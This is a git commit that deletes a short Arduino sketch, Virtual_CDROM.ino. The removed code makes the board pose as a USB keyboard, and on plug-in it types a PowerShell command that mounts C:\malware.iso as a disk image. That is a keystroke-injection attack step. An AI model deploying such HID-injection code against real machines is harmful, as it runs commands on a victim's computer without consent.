75a08f42c6f4ca95eba98e28cab00f831c79eb1b
mohsen akhavan <77884120+mohsenakhavan@users.noreply.github.com>
2025-02-08 22:44:28 +0330

    Delete Virtual_CDROM.ino

--- Virtual_CDROM.ino
+++
@@ -1,8 +0,0 @@
-#include <USBHIDKeyboard.h>
-USBHIDKeyboard Keyboard;
-
-void setup() {
-  Keyboard.begin();
-  delay(3000);
-  Keyboard.println(F("powershell -c \"Mount-DiskImage -ImagePath C:\\malware.iso -StorageType ISO\""));
-}
